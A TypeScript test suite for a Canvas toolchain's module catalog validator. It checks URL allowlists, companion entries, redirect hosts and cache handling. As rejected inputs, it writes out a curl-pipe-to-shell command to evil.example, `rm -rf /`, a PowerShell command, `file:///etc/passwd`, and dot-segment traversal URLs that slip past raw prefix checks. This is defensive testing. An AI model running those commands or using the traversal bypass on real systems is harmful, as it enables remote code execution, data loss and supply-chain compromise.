import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, rmSync, writeFileSync, readFileSync, existsSync, statSync } from 'node:fs';
import { join } from 'node:path';
import { tmpdir, platform } from 'node:os';
import { sha256File } from '../src/channel/hash.js';
import {
  validateCatalog, fetchCatalog, CatalogError, SUPPORTED_CATALOG_VERSION, MAX_ARTIFACT_BYTES,
  isAllowedRedirectHost, isAllowedArtifactUrl, isAllowedCompanionUrl, ALLOWED_ARTIFACT_URL_PREFIX,
} from '../src/channel/catalog.js';

const GOOD_ENTRY = {
  id: 'announcements', name: 'Announcements Auditor', description: 'Audit scheduled announcements.',
  version: '1.1.0', minHostVersion: '2.1.0',
  artifactUrl: 'https://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/modules/announcements/1.1.0/announcements-1.1.0.mjs',
  sha256: 'a'.repeat(64), sizeBytes: 1234,
};
const GOOD_COMPANION = {
  id: 'canvas-backup', name: 'Canvas Backup',
  summary: 'Downloads a complete local archive of a Canvas course.',
  whyYouWantIt: 'The toolchain reads a Canvas Backup archive as the start of the pipeline. It also works on its own.',
  url: 'https://github.com/Ryfter/Canvas-Download',
  worksWithoutToolchain: true,
};
const GOOD_CATALOG = { catalogVersion: SUPPORTED_CATALOG_VERSION, modules: [GOOD_ENTRY], companions: [GOOD_COMPANION] };

function fakeFetch(status: number, body: unknown): typeof fetch {
  return (async () => new Response(JSON.stringify(body), { status })) as unknown as typeof fetch;
}

let dir: string;
beforeEach(() => { dir = mkdtempSync(join(tmpdir(), 'cc-catalog-')); });
afterEach(() => { rmSync(dir, { recursive: true, force: true }); });

describe('sha256File', () => {
  it('hashes file contents as lowercase hex', async () => {
    const f = join(dir, 'x.bin');
    writeFileSync(f, 'hello');
    // echo -n hello | sha256sum
    expect(await sha256File(f)).toBe('2cf24dba5fb0a30e26e83b2ac5b9e29e1b161e5c1fa7425e73043362938b9824');
  });
});

describe('validateCatalog', () => {
  it('accepts a well-formed catalog', () => {
    expect(validateCatalog(GOOD_CATALOG).modules[0].id).toBe('announcements');
  });
  it('refuses a newer catalogVersion with CATALOG_VERSION_UNSUPPORTED', () => {
    expect(() => validateCatalog({ ...GOOD_CATALOG, catalogVersion: 3 }))
      .toThrowError(expect.objectContaining({ code: 'CATALOG_VERSION_UNSUPPORTED' }));
  });
  it('refuses entries missing required fields or with a malformed sha256', () => {
    const bad = { ...GOOD_ENTRY, sha256: 'nothex' };
    expect(() => validateCatalog({ catalogVersion: 2, modules: [bad] }))
      .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
    const missing = { ...GOOD_ENTRY } as Record<string, unknown>;
    delete missing.artifactUrl;
    expect(() => validateCatalog({ catalogVersion: 2, modules: [missing] }))
      .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
  });
  it('ignores unknown fields (forward compatibility)', () => {
    const entry = { ...GOOD_ENTRY, futureField: 'ok' };
    expect(validateCatalog({ catalogVersion: 2, modules: [entry], futureTop: true }).modules).toHaveLength(1);
  });
  it('refuses an id that does not match the module-id format', () => {
    const bad = { ...GOOD_ENTRY, id: 'Bad_ID' };
    expect(() => validateCatalog({ catalogVersion: 2, modules: [bad] }))
      .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
  });
  it('refuses non-finite, non-integer, non-positive, or oversized sizeBytes (#125)', () => {
    for (const sizeBytes of [NaN, Infinity, -Infinity, 0, -1, 1.5, 1e15, MAX_ARTIFACT_BYTES + 1]) {
      const bad = { ...GOOD_ENTRY, sizeBytes };
      expect(() => validateCatalog({ catalogVersion: 2, modules: [bad] }))
        .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
    }
    const atCeiling = { ...GOOD_ENTRY, sizeBytes: MAX_ARTIFACT_BYTES };
    expect(validateCatalog({ catalogVersion: 2, modules: [atCeiling] }).modules).toHaveLength(1);
  });
  it('refuses duplicate ids across entries, naming the id', () => {
    expect(() => validateCatalog({ catalogVersion: 2, modules: [GOOD_ENTRY, { ...GOOD_ENTRY }] }))
      .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID', message: expect.stringContaining(GOOD_ENTRY.id) }));
  });
});

describe('validateCatalog — artifact host (v2)', () => {
  it('refuses an artifactUrl outside the repo modules directory on raw.githubusercontent.com', () => {
    for (const artifactUrl of [
      'https://evil.example/m.mjs',
      'http://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/modules/a/1.0.0/a-1.0.0.mjs',
      'https://raw.githubusercontent.com/SomeoneElse/canvas-toolchain/main/modules/a/1.0.0/a-1.0.0.mjs',
      'https://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/scripts/evil.mjs',
      // The v2.0 hosting scheme is no longer accepted:
      'https://github.com/Ryfter/canvas-toolchain/releases/download/module-announcements-v1.1.0/module-announcements-1.1.0.mjs',
      // Dot-segment traversal: passes a raw startsWith(prefix) check but the WHATWG
      // URL parser collapses the '..' segments to a different owner entirely.
      'https://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/modules/../../../../AttackerOwner/evil-repo/main/payload.mjs',
    ]) {
      expect(() => validateCatalog({ ...GOOD_CATALOG, modules: [{ ...GOOD_ENTRY, artifactUrl }] }))
        .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
    }
  });
});

describe('isAllowedArtifactUrl — normalized-URL comparison, not raw-string prefix', () => {
  it('refuses a dot-segment traversal that a raw prefix check would miss', () => {
    // startsWith(ALLOWED_ARTIFACT_URL_PREFIX) on the RAW string passes (the text
    // literally begins with the prefix); new URL(...).href collapses the '..'
    // segments and lands on a completely different owner/repo. Verified:
    //   new URL('.../main/modules/../../../../AttackerOwner/evil-repo/main/payload.mjs').href
    //   === 'https://raw.githubusercontent.com/AttackerOwner/evil-repo/main/payload.mjs'
    const evil = 'https://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/modules/../../../../AttackerOwner/evil-repo/main/payload.mjs';
    expect(evil.startsWith(ALLOWED_ARTIFACT_URL_PREFIX)).toBe(true); // the raw-string trap
    expect(isAllowedArtifactUrl(evil)).toBe(false);
  });

  it('accepts the legitimate artifact URL', () => {
    expect(isAllowedArtifactUrl(GOOD_ENTRY.artifactUrl)).toBe(true);
  });

  it('refuses a non-string', () => {
    expect(isAllowedArtifactUrl(undefined)).toBe(false);
    expect(isAllowedArtifactUrl(123)).toBe(false);
    expect(isAllowedArtifactUrl(null)).toBe(false);
  });

  it('refuses a value new URL() cannot parse', () => {
    expect(isAllowedArtifactUrl('not a url at all')).toBe(false);
  });

  it('refuses a non-https scheme even under the right host/path', () => {
    expect(isAllowedArtifactUrl(
      'http://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/modules/a/1.0.0/a-1.0.0.mjs',
    )).toBe(false);
  });

  it('refuses a lookalike host that merely contains the real one', () => {
    expect(isAllowedArtifactUrl(
      'https://raw.githubusercontent.com.evil.example/Ryfter/canvas-toolchain/main/modules/a/1.0.0/a-1.0.0.mjs',
    )).toBe(false);
  });

  it('refuses a URL that merely contains the prefix later in the string (query trick)', () => {
    expect(isAllowedArtifactUrl(
      'https://evil.example/?x=https://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/modules/a/1.0.0/a-1.0.0.mjs',
    )).toBe(false);
  });

  it('percent-encoded traversal does not survive URL normalization as a real ".." — stays a literal segment', () => {
    // %2f is NOT decoded to '/' by the WHATWG URL parser, so '..%2f' never becomes a
    // real path separator and is never collapsed the way a literal '..' segment is.
    // Verified: new URL(payload).href === the input, unchanged — it does NOT escape
    // the modules/ directory. Documenting the actual (safe) behavior rather than
    // assuming it behaves like the unencoded case.
    const payload = 'https://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/modules/..%2f..%2f..%2f..%2fAttackerOwner/evil-repo/main/payload.mjs';
    const normalized = new URL(payload).href;
    expect(normalized.startsWith(ALLOWED_ARTIFACT_URL_PREFIX)).toBe(true); // never escapes modules/
    expect(isAllowedArtifactUrl(payload)).toBe(true); // harmlessly literal, not a bypass
  });
});

describe('validateCatalog — companions', () => {
  it('accepts a well-formed companion and defaults the array to empty when absent', () => {
    expect(validateCatalog(GOOD_CATALOG).companions[0].id).toBe('canvas-backup');
    expect(validateCatalog({ catalogVersion: 2, modules: [GOOD_ENTRY] }).companions).toEqual([]);
  });

  it('refuses any field outside the permitted set — the catalog carries no executable payload', () => {
    for (const extra of [
      { installCommand: 'curl https://evil.example/x.sh | sh' },
      { script: 'rm -rf /' },
      { cmd: 'powershell -c whoami' },
      { exec: 'node evil.js' },
      { artifactUrl: 'https://raw.githubusercontent.com/Ryfter/canvas-toolchain/main/modules/x/1.0.0/x-1.0.0.mjs' },
    ]) {
      expect(() => validateCatalog({ ...GOOD_CATALOG, companions: [{ ...GOOD_COMPANION, ...extra }] }))
        .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
    }
  });

  it('refuses a companion url that is not https on github.com', () => {
    for (const url of [
      'http://github.com/Ryfter/Canvas-Download',
      'https://evil.example/Canvas-Download',
      'https://github.com.evil.example/x',
      'file:///etc/passwd',
      // Dot-segment traversal: 'https://github.com/Ryfter/Canvas-Download/../../evil-owner/evil-repo'
      // passes a raw startsWith('https://github.com/') check but normalizes to a
      // different owner/repo entirely. Browsers apply the same collapse, so a crafted
      // companion entry displays as one repo and navigates to another.
      // Verified: new URL(url).href === 'https://github.com/evil-owner/evil-repo'
      'https://github.com/Ryfter/Canvas-Download/../../evil-owner/evil-repo',
    ]) {
      expect(() => validateCatalog({ ...GOOD_CATALOG, companions: [{ ...GOOD_COMPANION, url }] }))
        .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
    }
  });

  it('refuses a companion missing a required field', () => {
    const missing = { ...GOOD_COMPANION } as Record<string, unknown>;
    delete missing.whyYouWantIt;
    expect(() => validateCatalog({ ...GOOD_CATALOG, companions: [missing] }))
      .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID' }));
  });

  it('refuses an id shared between a module and a companion', () => {
    const clash = { ...GOOD_COMPANION, id: 'announcements' };
    expect(() => validateCatalog({ ...GOOD_CATALOG, companions: [clash] }))
      .toThrowError(expect.objectContaining({ code: 'CATALOG_INVALID', message: expect.stringContaining('announcements') }));
  });
});

describe('isAllowedCompanionUrl — normalized-URL comparison, not raw-string prefix', () => {
  it('refuses the dot-segment traversal that defeats a raw prefix check', () => {
    const evil = 'https://github.com/Ryfter/Canvas-Download/../../evil-owner/evil-repo';
    expect(evil.startsWith('https://github.com/')).toBe(true); // the raw-string trap
    expect(isAllowedCompanionUrl(evil)).toBe(false);
  });
  it('accepts the legitimate companion URL', () => {
    expect(isAllowedCompanionUrl(GOOD_COMPANION.url)).toBe(true);
  });
  it('refuses a non-string, an unparseable value, and a non-https scheme', () => {
    expect(isAllowedCompanionUrl(undefined)).toBe(false);
    expect(isAllowedCompanionUrl('not a url')).toBe(false);
    expect(isAllowedCompanionUrl('http://github.com/Ryfter/Canvas-Download')).toBe(false);
  });
});

describe('validateCatalog — version', () => {
  it('accepts catalogVersion 2 and refuses 3', () => {
    expect(validateCatalog({ ...GOOD_CATALOG, catalogVersion: 2 }).catalogVersion).toBe(2);
    expect(() => validateCatalog({ ...GOOD_CATALOG, catalogVersion: 3 }))
      .toThrowError(expect.objectContaining({ code: 'CATALOG_VERSION_UNSUPPORTED' }));
  });
});

describe('isAllowedRedirectHost (#121)', () => {
  it('accepts the GitHub asset hosts that actually serve release downloads', () => {
    // GitHub rotates this host without notice: it was objects.githubusercontent.com,
    // and as of 2026-07 release downloads 302 to release-assets.githubusercontent.com.
    // Pinning one exact hostname refused every install — hence the domain allowlist.
    expect(isAllowedRedirectHost('release-assets.githubusercontent.com')).toBe(true);
    expect(isAllowedRedirectHost('objects.githubusercontent.com')).toBe(true);
    expect(isAllowedRedirectHost('githubusercontent.com')).toBe(true);
  });

  it('refuses lookalike domains that merely contain the allowed one', () => {
    for (const host of [
      'evil.example',
      'evil-githubusercontent.com',
      'githubusercontent.com.evil.example',
      'notgithubusercontent.com',
      'githubusercontent.evil.com',
    ]) {
      expect(isAllowedRedirectHost(host)).toBe(false);
    }
  });
});

describe('fetchCatalog', () => {
  it('fetches, validates, and writes the cache', async () => {
    const cachePath = join(dir, 'cache.json');
    const cat = await fetchCatalog({ fetchImpl: fakeFetch(200, GOOD_CATALOG), cachePath });
    expect(cat.modules[0].id).toBe('announcements');
    expect(existsSync(cachePath)).toBe(true);
  });
  it('writes the cache atomically with owner-only permissions (#127)', async () => {
    const cachePath = join(dir, 'cache.json');
    await fetchCatalog({ fetchImpl: fakeFetch(200, GOOD_CATALOG), cachePath });
    if (platform() !== 'win32') expect(statSync(cachePath).mode & 0o777).toBe(0o600);
    expect(existsSync(`${cachePath}.tmp`)).toBe(false);
  });
  it('serves a fresh cache without fetching', async () => {
    const cachePath = join(dir, 'cache.json');
    writeFileSync(cachePath, JSON.stringify({ fetchedAt: new Date().toISOString(), catalog: GOOD_CATALOG }));
    let called = false;
    const spy: typeof fetch = (async () => { called = true; return new Response('{}'); }) as unknown as typeof fetch;
    const cat = await fetchCatalog({ fetchImpl: spy, cachePath });
    expect(cat.modules).toHaveLength(1);
    expect(called).toBe(false);
  });
  it('falls back to a stale cache when the network fails', async () => {
    const cachePath = join(dir, 'cache.json');
    writeFileSync(cachePath, JSON.stringify({ fetchedAt: '2000-01-01T00:00:00Z', catalog: GOOD_CATALOG }));
    const failing: typeof fetch = (async () => { throw new Error('offline'); }) as unknown as typeof fetch;
    const cat = await fetchCatalog({ fetchImpl: failing, cachePath });
    expect(cat.modules[0].id).toBe('announcements');
  });
  it('throws CATALOG_UNREACHABLE when the network fails and no cache exists', async () => {
    const failing: typeof fetch = (async () => { throw new Error('offline'); }) as unknown as typeof fetch;
    await expect(fetchCatalog({ fetchImpl: failing, cachePath: join(dir, 'none.json') }))
      .rejects.toMatchObject({ code: 'CATALOG_UNREACHABLE' });
  });
});
